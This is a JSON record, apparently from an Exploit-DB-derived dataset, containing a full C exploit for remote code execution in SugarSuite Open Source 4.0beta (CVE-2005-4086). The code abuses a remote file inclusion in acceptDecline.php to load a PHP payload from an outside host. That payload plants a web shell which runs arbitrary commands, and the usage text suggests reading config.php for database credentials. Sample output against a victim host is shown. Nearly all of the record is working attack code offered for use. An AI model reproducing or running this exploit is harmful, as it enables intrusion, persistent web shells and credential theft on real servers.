{
  "id": "1364",
  "title": "SugarSuite Open Source 4.0beta - Remote Code Execution (2)",
  "cve": "CVE-2005-4086",
  "vuln_type": "rce",
  "code": "/*\r\n\r\ngcc -o sugar sugar.c\r\n\r\nUsage ./sugar [host] [/path/] [site] [cmd]\r\n\r\nSugar Suite Open Source <= 4.0 beta remote code execution (c code)\r\ncoded by: pointslash v.\r\ncredits: rgod, unitedasia\r\n\r\nhost - hostname (ex: www.sitename.com)\r\npath - path (ex: /sugar/ or just / )\r\nsite - remote location ( ex: http://www.somesite.com/file.txt)\r\ncmd  - specify a command (\"cat config.php\" to see database username & password)\r\n\r\nexample ./sugar www.victim.com /CRM35/ http://othersite.com/file.txt uname%20-a;\r\n\r\nPut this in your file.txt\r\n\r\n<?php\r\n$fp=fopen(\"pointslash.php\",\"w\");\r\nfputs($fp,\"<? error_reporting(0);ini_set('max_execution_time',0); system(\\$HTTP_GET_VARS[cmd]);?>\");\r\nfclose($fp);\r\n?>\r\n\r\n./sugar  www.victim.com /CRM35/ http://othersite.com/file.txt ls%20-al\r\n\r\nHTTP/1.1 200 OK\r\nDate: Thu, 08 Dec 2005 12:35:33 GMT\r\nServer: Apache/1.3.27 (Unix)  (Red-Hat/Linux) PHP/4.3.10 mod_perl/1.27\r\nX-Powered-By: PHP/4.3.10\r\nConnection: close\r\nContent-Type: text/html\r\n\r\nLinux victim.com 2.4.9-e.57smp #1 SMP Thu Dec 2 20:51:12 EST 2004 i686 unknown\r\n\r\n\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n#include <errno.h>\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <netdb.h>\r\n\r\n#define HTTP_PORT 80\r\n\r\n\r\n#define DATA \"\\ncompile gcc -o sugar sugar.c\\n\\nexample ./sugar www.victim.com /CRM35/ http://othersite.com/file.txt uname%%20-a;\\n\\nPut this in your file.txt\\n\\n<?php\\n$fp=fopen(\\\"pointslash.php\\\",\\\"w\\\");\\nfputs($fp,\\\"<? error_reporting(0);ini_set('max_execution_time',0); system(\\\\$HTTP_GET_VARS[cmd]);?>\\\");\\nfclose($fp);\\n?>\\n\\n\"\r\n\r\n\r\n/****************** MAIN *********************/\r\n\r\nvoid sendpacket(char buffer[8192], int p, char host[100]);\r\n\r\n\r\nint main( int argc, char **argv)\r\n{\r\n\r\n    char buffer[8192];\r\n    int count;\r\n    char data[190];\r\n    if(argc<5)\r\n    {\r\n         printf(\"Usage %s [host] [/path/] [site] [cmd]\\n\\nSugar Suite Open Source <= 4.0 beta remote code execution (c code)\\ncoded by: pointslash \\ncredits: rgod, unitedasia\\n\\n\",argv[0]);\r\n         printf(\"host - hostname (ex:www.sitename.com)\\n\");\r\n         printf(\"path - path (ex: /sugar/ or just / )\\n\");\r\n         printf(\"site - remote location ( ex: http://www.somesite.com/file.txt)\\n\");\r\n         printf(\"cmd  - specify a command (\\\"cat config.php\\\" to see database username & password)\\n\");\r\n         sprintf(data, DATA);\r\n         printf(data);\r\n         exit(1);\r\n    }\r\n\r\n\r\n    sprintf( buffer, \"GET %sacceptDecline.php?beanFiles[1]=%s&beanList[1]=1&module=1 HTTP/1.0\\nUser-Agent: MantraAgent\\nHost: %s\\nConnection: Close\\n\\n\", argv[2], argv[3], argv[1]);\r\n\r\n    sendpacket(buffer,0,argv[1]);\r\n\r\n    sprintf( buffer, \"GET %spointslash.php?cmd=%s HTTP/1.0\\nUser-Agent: Vagabondo/2.0 MT\\nHost: %s\\nConnection: Close\\n\\n\", argv[2], argv[4], argv[1]);\r\n\r\n    sendpacket(buffer,1,argv[1]);\r\n\r\n    return count;\r\n}\r\n\r\nvoid sendpacket(char buffer[8192], int p, char host[100])\r\n{\r\n\r\n    struct sockaddr_in server;\r\n    struct hostent *host_info;\r\n    unsigned long addr;\r\n    int sock;\r\n    char dat[8192];\r\n    int count;\r\n\r\n    /* create socket */\r\n    sock = socket( PF_INET, SOCK_STREAM, 0);\r\n    if (sock < 0) {\r\n        perror( \"failed to create socket\");\r\n        exit(1);\r\n    }\r\n\r\n    /* Create socketadress of Server\r\n     * it is type, IP-adress and portnumber */\r\n    memset( &server, 0, sizeof (server));\r\n\r\n    /* convert the Servername to a IP-Adress */\r\n    host_info = gethostbyname( host);\r\n    if (NULL == host_info) {\r\n        fprintf( stderr, \"unknown server: %s\\n\", host);\r\n        exit(1);\r\n    }\r\n    memcpy( (char *)&server.sin_addr, host_info->h_addr, host_info->h_length);\r\n\r\n    server.sin_family = AF_INET;\r\n    server.sin_port = htons( HTTP_PORT);\r\n\r\n\r\n    /* connect to the server */\r\n    if ( connect( sock, (struct sockaddr*)&server, sizeof( server)) < 0) {\r\n        perror( \"can't connect to server\");\r\n        exit(1);\r\n    }\r\n\r\n    send( sock, buffer, strlen( buffer), 0);\r\n\r\n    /* get the answer from server and put it out to stdout */\r\n    if (p==1) {\r\n      do {\r\n          count = recv( sock, buffer, sizeof(buffer), 0);\r\n          write( 1, buffer, count);\r\n      }\r\n      while (count > 0);\r\n    }\r\n\r\n    /* close the connection to the server */\r\n    close ( sock);\r\n\r\n}\r\n\r\n// milw0rm.com [2005-12-08]",
  "url": "https://www.exploit-db.com/exploits/1364"
}